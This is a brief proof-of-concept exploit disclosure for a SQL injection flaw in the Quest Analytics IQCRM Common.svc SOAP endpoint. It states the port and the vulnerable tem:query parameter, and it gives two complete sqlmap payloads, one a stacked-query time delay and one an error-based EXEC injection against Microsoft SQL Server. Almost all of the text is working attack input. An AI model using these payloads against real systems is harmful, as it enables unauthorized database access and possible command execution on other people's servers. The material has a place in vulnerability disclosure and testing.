Quest Analytics IQCRM/Proof of Concept

# This was tested on two different Windows Servers 2016/2019. The WSDL endpoint may be on different ports on the web server. I tested on port 81 against the Common.svc page.
# Below are sample POST bodies from SQLmap that were used against the Common.svc page and their relevant SQL Injection types

http://x.x.x.x:81/Common.svc (POST)

Parameter: SOAP tem:query ((custom) POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:ExecuteQuery>
         <!--type: int-->
         <tem:empId>3</tem:empId>
         <!--type: string-->
         <tem:query>gero et;WAITFOR DELAY '0:0:5'--</tem:query>
      </tem:ExecuteQuery>
   </soapenv:Body>
</soapenv:Envelope>

-------------------------------------------------------------------------

Parameter: SOAP tem:query ((custom) POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase error-based - Stacking (EXEC)
    Payload: <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:ExecuteQuery>
         <!--type: int-->
         <tem:empId>3</tem:empId>
         <!--type: string-->
         <tem:query>gero et;DECLARE @kisC NVARCHAR(4000);SET @kisC=(SELECT 'qxjxq'+(SELECT (CASE WHEN (3779=3779) THEN '1' ELSE '0' END))+'qxvbq');EXEC @kisC--</tem:query>
      </tem:ExecuteQuery>
   </soapenv:Body>
</soapenv:Envelope>
